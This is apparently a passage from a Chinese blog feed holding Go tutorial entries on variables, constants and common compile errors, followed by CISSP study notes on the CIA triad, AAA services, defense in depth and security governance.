class="hljs-type">string</span><br>c := <span class="hljs-number">1</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>fmt.Println(a, b, c)<br><br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> build hello.<span class="hljs-keyword">go</span><br># command-line-arguments<br>./hello.<span class="hljs-keyword">go</span>:<span class="hljs-number">11</span>:<span class="hljs-number">4</span>: syntax <span class="hljs-type">error</span>: unexpected :=, expected =<br></code></pre></td></tr></table></figure><p>2、相同代码块不可以重复声明变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">1</span><br>a := <span class="hljs-number">2</span><br>fmt.Println(a)<br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span>  <br># command-line-arguments<br>./hello.<span class="hljs-keyword">go</span>:<span class="hljs-number">9</span>:<span class="hljs-number">4</span>: no <span class="hljs-built_in">new</span> variables on left side of :=<br></code></pre></td></tr></table></figure><p>3、全局变量名可以和局部变量名相同，代码块中声明的变量优先</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">var</span> (<br><span class="hljs-selector-tag">a</span> int<br>)<br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">a</span> := <span class="hljs-string">&quot;test&quot;</span><br>fmt.<span class="hljs-built_in">Println</span>(a)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>test<br></code></pre></td></tr></table></figure><p>4、局部变量声明必须使用，全局变量声明可以不使用</p><p>5、多变量赋值，值按顺序赋值给变量名</p><p>6、变量值交换</p><p>a, b&#x3D;b, a</p><p>变量类型必须一致</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">a</span> := <span class="hljs-string">&quot;a value&quot;</span><br><span class="hljs-selector-tag">b</span> := <span class="hljs-string">&quot;b value&quot;</span><br><span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">b</span>, <span class="hljs-selector-tag">a</span><br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a = &quot;</span> + a)<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;b = &quot;</span> + b)<br>&#125;<br><br>➜  firstGoland go run hello<span class="hljs-selector-class">.go</span><br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-tag">b</span> value<br><span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span> value<br></code></pre></td></tr></table></figure><p>7、空白标识符 _ 用于抛弃值，常用于获取函数返回值</p><p>因为go语言要求必须使用所有变量，日常开发会存在从函数获取到不使用值的可能性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>_, testfuncb := testfunc()<br>fmt.Println(testfuncb)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testfunc</span><span class="hljs-params">()</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) &#123; <span class="hljs-comment">//可以返回多个值</span><br>a := <span class="hljs-string">&quot;a value&quot;</span><br>b := <span class="hljs-string">&quot;b value&quot;</span><br><span class="hljs-comment">//fmt.Println(&quot;a = &quot; + a)</span><br><span class="hljs-comment">//fmt.Println(&quot;b = &quot; + b)</span><br><span class="hljs-keyword">return</span> a, b<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>b value<br></code></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>程序运行不会修改常量的值</p><p>常量只能是数字型（整型、浮点型、复数）、布尔型和字符串型</p><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><p>const 常量名 [常量类型] &#x3D; 常量值</p><h4 id="显式定义类型"><a href="#显式定义类型" class="headerlink" title="显式定义类型"></a>显式定义类型</h4><p>const 常量名 常量类型 &#x3D; 常量值</p><p>const constname int &#x3D; 1</p><h4 id="隐式定义类型"><a href="#隐式定义类型" class="headerlink" title="隐式定义类型"></a>隐式定义类型</h4><p>const 常量名 &#x3D; 常量值</p><p>const constname1 &#x3D; “constname1”</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> constname <span class="hljs-type">int</span> = <span class="hljs-number">1</span><br>fmt.Println(constname)<br><br><span class="hljs-keyword">const</span> constname1 = <span class="hljs-string">&quot;constname1&quot;</span><br>fmt.Println(constname1)<br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run consttest.<span class="hljs-keyword">go</span><br><span class="hljs-number">1</span><br>constname1<br></code></pre></td></tr></table></figure><h4 id="多常量定义"><a href="#多常量定义" class="headerlink" title="多常量定义"></a>多常量定义</h4><p>const constname1, constname2, constname3 &#x3D; constvalue1, constvalue2, constvalue3</p><p>const (</p><p>constname1 &#x3D; constvalue1</p><p>constname2 &#x3D; constvalue2</p><p>constname3 &#x3D; constvalue3</p><p>)</p><h4 id="常量表达式"><a href="#常量表达式" class="headerlink" title="常量表达式"></a>常量表达式</h4><p>常量可以用len()、cap()、unsafe.Sizeof()函数计算表达式的值，只有内置函数才可以进行常量表达式计算</p><p>unsafe.Sizeof(var)：获取指定变量&#x2F;常量数据类型的字节数，根据变量&#x2F;常量类型，和存储的值无关，返回的是无符号整型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> constname1 = <span class="hljs-string">&quot;constvalue1&quot;</span><br><span class="hljs-keyword">const</span> lenconstname1 = <span class="hljs-built_in">len</span>(constname1)<br><br>fmt.Println(constname1, lenconstname1, unsafe.Sizeof(constname1))<br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run consttest.<span class="hljs-keyword">go</span><br>constvalue1 <span class="hljs-number">11</span> <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h3><p>特殊常量，可以被编译器修改的常量</p><p>iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang_error</title>
    <link href="/2024/12/24/dev/golang/golang_error/"/>
    <url>/2024/12/24/dev/golang/golang_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="runtime-main-main·f-function-main-is-undeclared-in-the-main-package"><a href="#runtime-main-main·f-function-main-is-undeclared-in-the-main-package" class="headerlink" title="runtime.main_main·f: function main is undeclared in the main package"></a>runtime.main_main·f: function main is undeclared in the main package</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ada">➜  gocode go run printgo.go<br># command-line-arguments<br>runtime.main_main·f: <span class="hljs-keyword">function</span> <span class="hljs-title">main</span> <span class="hljs-keyword">is</span> undeclared <span class="hljs-keyword">in</span> the main <span class="hljs-keyword">package</span><br><span class="hljs-title"><span class="hljs-keyword">package</span> main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func printtest() &#123;<br>fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h3><p>Go程序中找不到主函数（main函数）的定义或声明。在Go中，每个可执行程序都必须包含一个名为<code>main</code>的包，并在该包中包含一个名为<code>main</code>的函数。这个<code>main</code>函数是程序的入口点，它会被自动调用。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>增加main函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printtest</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>printtest()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="go-run-提示package-command-line-arguments-is-not-a-main-package"><a href="#go-run-提示package-command-line-arguments-is-not-a-main-package" class="headerlink" title="go run 提示package command-line-arguments is not a main package"></a>go run 提示package command-line-arguments is not a main package</h2><h3 id="报错信息-1"><a href="#报错信息-1" class="headerlink" title="报错信息"></a>报错信息</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> code<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> booltest <span class="hljs-type">bool</span> = <span class="hljs-literal">true</span><br><span class="hljs-built_in">println</span>(booltest)<br>&#125;<br><br>➜  code <span class="hljs-keyword">go</span> run booltest.<span class="hljs-keyword">go</span> <br><span class="hljs-keyword">package</span> command-line-arguments is not a main <span class="hljs-keyword">package</span><br></code></pre></td></tr></table></figure><h3 id="报错原因-1"><a href="#报错原因-1" class="headerlink" title="报错原因"></a>报错原因</h3><p>使用 go run 命令运行的包必须是主包，也就是package 需要声明为 main </p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>package code</p><p>修改为</p><p>package main</p>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1-域1安全与风险管理+域3安全架构与工程-实现安全治理的原则和策略</title>
    <link href="/2024/12/24/security/seccert/cissp/1-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86+%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86%E7%9A%84%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5/"/>
    <url>/2024/12/24/security/seccert/cissp/1-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86+%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86%E7%9A%84%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="1-1-安全-101"><a href="#1-1-安全-101" class="headerlink" title="1.1 安全 101"></a>1.1 安全 101</h1><p>信息技术（IT）或信息系统（IS）是支持业务操作或功能的硬件和软件。</p><p>安全是一种业务管理工具，旨在确保 IT&#x2F;IS 运行可靠且受到保护。</p><p>安全的存在是为了支持组织的目标、使命和宗旨。</p><p>采取安全框架提供起点，通过评估来微调安全。</p><p><strong>常见安全评估类型：风险评估、漏洞评估、渗透测试。</strong></p><p>风险评估：识别资产、威胁和漏洞，进行风险计算，从而利用风险指导安全改进。</p><p>漏洞评估：使用自动化工具来定位已知的安全弱点，通过添加防御措施或调整现有保护措施来解决弱点。</p><p>渗透测试：利用可信的个人对安全基础设施进行压力测试，找出风险评估和漏洞评估无法发现的问题，目标是在攻击者利用之前发现问题。</p><p><strong>安全应该具有成本效益。</strong></p><p>应该选择以最低资源成本提供最大保护的安全控制。</p><p><strong>安全应该是合法的。</strong></p><p>法律支持的安全将大大有助于使组织免于面临巨额罚款、处罚或过失指控。</p><p><strong>安全是一段旅途，而不是终点线。</strong></p><p>彻底的防护是不可能实现的，因为安全问题总是在变化。</p><h1 id="1-2-理解和应用安全概念"><a href="#1-2-理解和应用安全概念" class="headerlink" title="1.2 理解和应用安全概念"></a>1.2 理解和应用安全概念</h1><p>安全管理的概念与原则是实施安全策略和安全解决方案的核心内容。</p><p>保密性、完整性和可用性（confidentiality，integrity，and availability，CIA 三元组）被视为安全基础架构中的主要安全目标和宗旨。</p><h2 id="1-2-1-保密性"><a href="#1-2-1-保密性" class="headerlink" title="1.2.1 保密性"></a>1.2.1 保密性</h2><p><strong>保密性</strong>指为保障数据、客体或资源保密状态而采取的措施。</p><p><strong>保密性</strong>保护的目标是阻止或最小化未经授权的数据访问。</p><p><strong>保密性</strong>在保护授权访问的同时防止泄露。</p><p>违反保密性的行为：</p><p>1、直接的攻击</p><p>2、人为的未经授权的敏感或机密信息泄露。</p><p>违反保密性的原因：</p><p>1、用户或管理员的不当行为</p><p>2、安全策略的疏漏或配置有误</p><p>保障保密性的措施：</p><p>1、加密</p><p>2、填充网络流量</p><p>3、严格的访问控制</p><p>4、严格的身份认证程序</p><p>5、数据分类</p><p>6、充分的人员培训</p><p>保密性的概念、条件和特征：</p><p><strong>敏感性</strong> 指信息的特性，这种特性的数据一旦泄露就会导致伤害或损失。</p><p><strong>判断力</strong> 是一种决策行为-操作者可影响或控制信息泄露，以将伤害或损失程度降至最低。</p><p><strong>关键性</strong> 信息的关键程度是其关键性的衡量标准。</p><p>关键级别越高，越需要保持信息的保密性。</p><p><strong>隐藏</strong> 隐藏（concealment）指藏匿或防止泄露的行为。</p><p><strong>保密</strong>  保密是指对某事保密或防止信息泄露的行为。</p><p><strong>隐私</strong>  隐私是指对个人身份或可能对他人造成伤害、令他人感到尴尬的信息保密。</p><p><strong>隔绝</strong>  隔绝（seclusion）是把东西放在不可到达的地方，可能有严格的访问控制。</p><p><strong>隔离</strong> 隔离（isolation）是使某些事物与其他事物保持分离的行为。</p><h2 id="1-2-2-完整性"><a href="#1-2-2-完整性" class="headerlink" title="1.2.2 完整性"></a>1.2.2 完整性</h2><p>完整性是保护数据可靠性和正确性的概念。</p><p>完整性保护措施防止未经授权的数据更改。</p><p>检验完整性：</p><ul><li>防止未经授权的主体进行修改。</li><li>防止授权主体进行未经授权的修改，例如引入错误。</li><li>保持客体内外一致以使客体的数据能够真实反映现实世界，而且与任何其他客体的关系都是有效的、一致的和可验证的。</li></ul><p>完整性风险：</p><p>1、来自攻击，例如病毒、逻辑炸弹、未经授权的访问、编码和应用程序中的错误、恶意修改、故意替换及系统后门</p><p>2、来自人为，例如人为错误、疏忽或不称职</p><p>3、来自配置缺陷，安全策略疏漏或配置有误的安全控制</p><p>保护完整性的措施：</p><p>1、严格的访问控制</p><p>2、严格的身份认证流程</p><p>3、入侵检测系统</p><p>4、客体&#x2F;数据加密</p><p>5、哈希值验证</p><p>6、接口限制</p><p>7、输入&#x2F;输出功能检查</p><p>8、充分的人员培训</p><p><strong>保密性和完整性相互依赖。没有客体完整性，就无法维持客体保密性。</strong></p><p><strong>完整性依赖于保密性和访问控制。</strong></p><p>完整性相关概念、条件和特征：</p><ul><li><strong>准确性</strong>：正确且精确无误。</li><li><strong>真实性</strong>：真实地反映现实。</li><li><strong>有效性</strong>：实际上（逻辑上）是正确的。</li><li><strong>问责制</strong>：对行为和结果负有责任或义务。</li><li><strong>职责</strong>：负责或控制某人或某事。</li><li><strong>完整性</strong>：拥有全部必需的组件或部件。</li><li><strong>全面性</strong>：完整的范围，充分包含所有必需的元素。</li></ul><h2 id="1-2-3-可用性"><a href="#1-2-3-可用性" class="headerlink" title="1.2.3 可用性"></a>1.2.3 可用性</h2><p><strong>可用性意味着</strong>授权主体被授予实时的、不间断的客体访问权限。</p><p>保护控制措施提供充足带宽和实时的处理能力。</p><p><strong>可用性还意味着</strong>支撑性基础设施（包括网络服务、通信和访问控制机制）是可用的，并允许授权用户获取授权的访问。</p><p>可用性威胁：</p><p>1、设备故障、软件错误和环境问题（过热、静电、洪水、断电等）</p><p>2、攻击：DoS 攻击、客体破坏和通信中断</p><p>3、人为：人为错误、疏忽或不称职</p><p>4、配置缺陷：安全策略疏漏或配置有误的安全控制</p><p>可用性防护措施：</p><p>1、正确设计中转系统</p><p>2、有效使用访问控制</p><p>3、监控性能和网络流量</p><p>4、使用防火墙和路由器防止 DOS 攻击</p><p>5、关键系统实施冗余机制</p><p>6、维护和测试备份系统</p><p><strong>可用性依赖于完整性和保密性，没有完整性和保密性，无法维持可用性。</strong></p><p>可用性相关概念、条件和特征：</p><ul><li><strong>可用性</strong>：容易被主体使用或学习，或能被主体理解和控制的状态。</li><li><strong>可访问性</strong>：保证全部授权主体可与资源交互而不考虑主体的的能力或限制。</li><li><strong>及时性</strong>：及时、准时，在合理的时间内响应，或提供低时延的响应。</li></ul><h2 id="1-2-4-DAD、过度保护、真实性】不可否认性和-AAA服务"><a href="#1-2-4-DAD、过度保护、真实性】不可否认性和-AAA服务" class="headerlink" title="1.2.4 DAD、过度保护、真实性】不可否认性和 AAA服务"></a>1.2.4 DAD、过度保护、真实性】不可否认性和 AAA服务</h2><h3 id="DAD-三元组"><a href="#DAD-三元组" class="headerlink" title="DAD 三元组"></a>DAD 三元组</h3><p>DAD 三元组由泄露（disclosure）、修改（alteration）、破坏（destruction）组成。</p><p>代表 CIA 三元组中安全保护的失败。</p><h3 id="过度保护"><a href="#过度保护" class="headerlink" title="过度保护"></a>过度保护</h3><p>过度保护保密性会导致可用性受限。</p><p>过度保护完整性会导致可用性受限。</p><p>过度保护可用性会导致保密性和完整性受限。</p><h3 id="真实性"><a href="#真实性" class="headerlink" title="真实性"></a>真实性</h3><p>真实性（authenticity）是指数据是可信的或非伪造的并源自其声称的来源。</p><p>真实性与完整性有关，需要验证是否来自声称的来源。</p><h3 id="不可否认性"><a href="#不可否认性" class="headerlink" title="不可否认性"></a>不可否认性</h3><p>不可否认性（non-repudiation）确保事件的主体或引发事件的人不能否认事件的发生。</p><p>不可否认性技术原理：</p><ul><li>标识</li><li>身份认证</li><li>授权</li><li>问责制</li><li>审计</li></ul><p>不可否认性技术实施：</p><ul><li>数字证书</li><li>会话标识符</li><li>事务日志</li><li>其他事务性机制</li><li>访问控制机制</li></ul><h3 id="AAA-服务"><a href="#AAA-服务" class="headerlink" title="AAA 服务"></a>AAA 服务</h3><p>所有安全环境中的一个<strong>核心安全机制</strong>。</p><p>身份认证：authentication</p><p>授权：authorization</p><p>记账&#x2F;审计：accounting&#x2F;auditing</p><p>AAA 服务实际内容</p><ul><li>标识（identification）：当试图访问受保护的区域或系统时声明自己的身份</li><li>身份认证：核实&#x2F;证实身份</li><li>授权：对一个具体身份或主体，定义身份或主体对资源和客体的访问许可（如允许&#x2F;授予和&#x2F;或拒绝）</li><li>审计：记录与系统和主体相关的事件与活动日志</li><li>记账（或问责制）：通过审查日志文件来核查合规和违规情况，尤其是违反组织安全策略的情况，以便于让主体对自身行为负责。</li></ul><h4 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h4><p>主体必须提供身份标识来启动身份认证、授权和记账过程。</p><p>一旦主体被标识（即，一旦主体的身份被标识和验证），该身份标识就要对其接下来的所有行为负责。</p><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><p>验证所声明的身份标识是否有效的过程就是身份认证。</p><p>身份认证要求主体提供与所要求的身份对应的附加信息。</p><p>通常在一个流程中完成标识和身份认证两个步骤。提供身份标识是第一步，提供身份认证因子是第二步。</p><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>主体一旦通过身份认证，就必须进行访问授权。</p><p>鉴于已通过验证的身份被赋予的权利和特权，授权过程确保被请求的活动或对客体的访问是可以实现的。</p><p><strong>注意</strong>，不能仅因为主体已通过标识和身份认证过程，就认为主体已被授权执行任意功能或访问受控环境中的所有资源。</p><p>标识和身份认证体现了访问控制的全有或全无特性。</p><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>审计是一种程序化的过程：通过追踪和记录主体的操作，在验证过的系统中让主体为其行为负责。</p><p>审计也是对系统中未经授权的或异常的活动进行监测的过程。</p><p>审计记录主体及其客体的活动、记录应用和系统功能的活动。</p><p>审计的目的：</p><ul><li>检测主体的恶意行为</li><li>检测入侵企图</li><li>检测系统故障</li><li>重构事件</li><li>为起诉提供证据</li><li>生成问题报告和分析结果</li></ul><p>监控是一种观测或监督。</p><p>审计是把信息记录到档案或文件。</p><h4 id="记账（或问责制）"><a href="#记账（或问责制）" class="headerlink" title="记账（或问责制）"></a>记账（或问责制）</h4><p>组织的安全策略只在有问责制的情况下才能得到适当实施，也就是只有当主体对他们的行为负责时，才能保持安全性。</p><p>有效的问责制依赖于检验主体身份及追踪其活动的能力。</p><p>人员的问责制最终取决于身份认证过程的强度。</p><h2 id="1-2-5-保护机制"><a href="#1-2-5-保护机制" class="headerlink" title="1.2.5 保护机制"></a>1.2.5 保护机制</h2><h3 id="1-纵深防御"><a href="#1-纵深防御" class="headerlink" title="1. 纵深防御"></a>1. 纵深防御</h3><p>纵深防护也被称为分层（layering）防御</p><p>使用一系列控制中的多个控制。</p><p>没有哪个控制能防范所有可能的威胁。</p><p>多层防护解决方案允许使用许多不同的控制措施来抵御随时都可能出现的威胁。</p><p>应该使用串行层，而不是并行层。</p><p>串行配置的范围很窄，但是层级很深。</p><p>并行配制的范围很宽，但是层级很浅。</p><h4 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h4><p>级别</p><p>多级</p><p>分层</p><p>分类</p><p>分区</p><p>分域</p><p>隔离</p><p>孤岛</p><p>分段</p><p>格结果</p><p>保护环</p><h3 id="2-抽象"><a href="#2-抽象" class="headerlink" title="2. 抽象"></a>2. 抽象</h3><p>抽象（abstraction）是为了提高效率。</p><p>相似的元素被放入组、类或角色中。</p><p>权限配置可以对角色或分类实施。</p><p>抽象应用于安全的另一种方式是引入对象组（有时称为类），<strong>其中访问控制和操作权限的分配时基于对象组的</strong>。</p><h3 id="3-数据隐藏"><a href="#3-数据隐藏" class="headerlink" title="3. 数据隐藏"></a>3. 数据隐藏</h3><p>数据隐藏是指将数据存放在主体无法访问或读取的逻辑存储空间以防止数据被泄露或访问。</p><p>数据不可见且主体无法访问或看见。</p><p>数据隐藏的形式：</p><ul><li><p>防止未授权的访问者访问数据库</p></li><li><p>限制低安全级别的主体访问高安全级别的数据</p></li><li><p>阻止应用程序直接访问存储硬件</p></li></ul><p>隐写术是数据隐藏的一个范例。</p><p>数据隐藏是多级安全系统的一个重要特征。</p><p><strong>数据隐藏和隐匿保持安全区别</strong></p><p><strong>数据隐藏</strong>是指故意将数据存放在未授权主体无法查看或访问的位置</p><p><strong>隐匿保持安全</strong>是指不将客体的存储告知主体，以期望主体不能发现客体，但是如果发现，就可以访问数据。</p><h3 id="4-加密"><a href="#4-加密" class="headerlink" title="4. 加密"></a>4. 加密</h3><p>加密（encryption）科学目的在于对非预期的接受者隐藏通信的真实含义或意图。</p><h1 id="1-3-安全边界"><a href="#1-3-安全边界" class="headerlink" title="1.3 安全边界"></a>1.3 安全边界</h1><p>安全边界是具有不同安全要求或需求的任意两个区域、子网或环境之间的交界线。</p><p>安全边界存在于高安全区域和低安全区域之间。</p><p>需要识别网络和物理世界中的安全边界，部署机制控制跨安全边界的信息流。</p><p>不同的分类之间就是安全边界。</p><p>物理环境和逻辑环境之间也存在安全边界。</p><p>应该始终明确定义安全边界。</p><p>在安全策略中需要明确安全控制的终点或起点，并在物理环境和逻辑环境中确定该位置。</p><p>物理环境中的安全边界通常与逻辑环境的安全边界相对应。</p><p>将安全策略转化为实际控制时，必须分布考虑每个环境和安全边界。</p><p>选择最合理、最具成本效益和最有效的解决方案。</p><p>部署成本高于受保护对象价值的对策是没有意义的。</p><h1 id="1-4-评估和应用安全治理原则"><a href="#1-4-评估和应用安全治理原则" class="headerlink" title="1.4 评估和应用安全治理原则"></a>1.4 评估和应用安全治理原则</h1><p>安全治理是支持、评估、定义和指导组织安全工作相关的实践集合。</p><p>理想情况下，安全治理由董事会执行。</p><p>规模较小的组织，由首席执行官CEO 或首席信息安全官（CISO）执行安全治理活动。</p><p>安全治理的目标是将组织内所使用的安全流程和基础设施与从外部来源获得的知识和见解进行比对。</p><p>安全治理原则通常与公司和 IT 治理密切相关。</p><p>组织迫于法律和法规的要求必须实施治理，也必须遵守行业指南或许可证要求。</p><p>所有形式的治理（包括安全治理）都应该周期性进行评估和验证。</p><p>组织作为一个整体应该具备方向、指导和工具，以提供有效的监督和管理能力，解决威胁和风险；缩短停机时间，将潜在的损失或损害降至最低。</p><h2 id="1-4-1-第三方治理"><a href="#1-4-1-第三方治理" class="headerlink" title="1.4.1 第三方治理"></a>1.4.1 第三方治理</h2><p>一方面可能是由法律、法规、行业标准、合同义务或许可要求强制执行的外部实体监督系统</p><p>另一方是组织对所依赖的第三方应用进行安全监督，例如外包</p><p>侧重点在于验证其是否符合声明的安全目标、需求、法规和合同义务</p><h2 id="1-4-2-文件审查"><a href="#1-4-2-文件审查" class="headerlink" title="1.4.2 文件审查"></a>1.4.2 文件审查</h2><p>文件审查是查看交换材料并根据标准和期望对其进行验证的过程。</p><p>通常发生在现场检查之前，如果所交换的文件充分并且满足期望（或至少满足需求），那么现场审查将集中审查其与所声明文件是否相符；如果所交换的文件不完整、不准确或不充分，现场审查将推迟到文件更新或更正后进行。</p><p>如果文件不合规，那现场也可能不合规。</p><p>风险管理、风险评估和风险处置是执行流程&#x2F;策略评审时所使用的方法与技术。</p><h1 id="1-5-管理安全功能"><a href="#1-5-管理安全功能" class="headerlink" title="1.5 管理安全功能"></a>1.5 